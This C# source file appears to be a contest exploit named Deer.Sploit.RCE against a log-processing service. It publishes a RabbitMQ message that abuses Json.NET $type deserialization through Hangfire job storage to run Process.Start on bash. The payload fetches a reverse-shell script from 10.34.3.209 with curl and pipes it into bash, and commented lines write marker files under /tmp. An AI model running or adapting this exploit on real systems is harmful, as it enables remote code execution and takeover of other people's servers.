using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Text;
using EasyNetQ;
using EasyNetQ.Topology;
using Hangfire.MemoryStorage.Dto;
using Hangfire.Storage.Monitoring;
using Newtonsoft.Json;
using ServerDto = Hangfire.MemoryStorage.Dto.ServerDto;

namespace Deer.Sploit.RCE
{
    class Program
    {
        static void Main(string[] args)
        {
            var host = "localhost";
            var user = "hacker";
            var password = "hacker";
            var logExchangeName = $"logs.{user}";

            using (var bus = RabbitHutch.CreateBus($"host={host};username={user};password={password}"))
            {
                var exchange = bus.Advanced.ExchangeDeclare(logExchangeName, ExchangeType.Fanout, passive: true);

                var properties = new MessageProperties{Type = "LogProcessor.Models.ElasticResponse`1[[LogProcessor.HangfireJobServer, LogProcessor]], LogProcessor"};
                var body = Encoding.UTF8.GetBytes(BuildJson());

                bus.Advanced.Publish(exchange, "", false, properties, body);
            }
        }

        private static string BuildJson()
        {
            var serverDto = new ServerDto
            {
                Data = "{\"WorkerCount\":20,\"Queues\":[\"default\"],\"StartedAt\":\"2019-08-15T06:09:52.769184Z\"}",
                LastHeartbeat = DateTime.UtcNow,
                Id = "de525862-7588-4a31-9387-26177fb4cab6"
            };
            var jobId = "2f2b3701-c692-476a-b8ca-c45d117b9225";
            var jobQueueId = 1;
            var jobQueueDto = new JobQueueDto
            {
                JobId = jobId,
                Queue = "default",
                AddedAt = DateTime.UtcNow.AddMinutes(-1),
                FetchedAt = null,
                Id = jobQueueId
            };
            
            var jobDto = new JobDto
            {
                State = new StateDto
                {
                    JobId = jobId,
                    Name = "Enqueued",
                    CreatedAt = DateTime.UtcNow,
                    Data = "{\"EnqueuedAt\":\"2019-08-15T06:09:52.7600490Z\",\"Queue\":\"default\"}",
                    Id = jobQueueId
                },
                //InvocationData = "{\"Type\":\"System.IO.File, System.IO.FileSystem, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"WriteAllText\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\",\"Arguments\":\"[\\\"\\\\\\\"/tmp/hack\\\\\\\"\\\",\\\"\\\\\\\"!!!HACK!!!\\\\\\\\n\\\\\\\"\\\"]\"}",
                InvocationData = "{\"Type\":\"System.Diagnostics.Process, System.Diagnostics.Process, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"Start\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\",\"Arguments\":\"[\\\"\\\\\\\"/bin/bash\\\\\\\"\\\",\\\"\\\\\\\"-c \\\\\\\\\\\\\\\"whoami > /tmp/hack3\\\\\\\\\\\\\\\"\\\\\\\"\\\"]\"}",
                //Arguments = "[\"\\\"/tmp/hack2\\\"\",\"\\\"!!!HACK2!!!\\\\n\\\"\"]",
                Arguments = "[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl http://10.34.3.209:8000/reverse-shell.pl|bash\\\\\\\"\\\"\"]",
                CreatedAt = DateTime.UtcNow,
                Id = jobId,
                History = new List<StateHistoryDto>(),
                Parameters = new List<JobParameterDto>()
                {
                    new JobParameterDto
                    {
                        Id = 1,
                        Name = "CurrentCulture",
                        Value = "\"en-US\"",
                        JobId = jobId
                    },
                    new JobParameterDto
                    {
                        Id = 2,
                        Name = "CurrentUICulture",
                        Value = "\"en-US\"",
                        JobId = jobId
                    }
                }
            };
            
            var dataDict = new ConcurrentDictionary<Type, ConcurrentDictionary<object, object>>();
            dataDict[typeof(ListDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(CounterDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(AggregatedCounterDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(HashDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(SetDto)] = new ConcurrentDictionary<object, object>();
            dataDict[typeof(ServerDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object> {{serverDto.Id, serverDto}});
            dataDict[typeof(JobQueueDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object>{{jobQueueDto.Id.ToString(), jobQueueDto}});
            dataDict[typeof(JobDto)] = new ConcurrentDictionary<object, object>(new Dictionary<object, object> {{jobDto.Id, jobDto}});
            
            var dataJson = $"{{\"Dictionary\" : {JsonConvert.SerializeObject(dataDict, new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto})}}}";
            var memoryStorageJson = $"{{\"$type\":\"Hangfire.MemoryStorage.MemoryStorage, Hangfire.MemoryStorage\", \"Data\" : {dataJson}}}";

            var hangfireJobServerJson = $"{{\"$type\":\"LogProcessor.HangfireJobServer, LogProcessor\", \"storage\" : {memoryStorageJson}}}";

            return $"{{\"$type\":\"LogProcessor.Models.ElasticResponse`1[[LogProcessor.HangfireJobServer, LogProcessor]], LogProcessor\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}}}";
        }
    }
}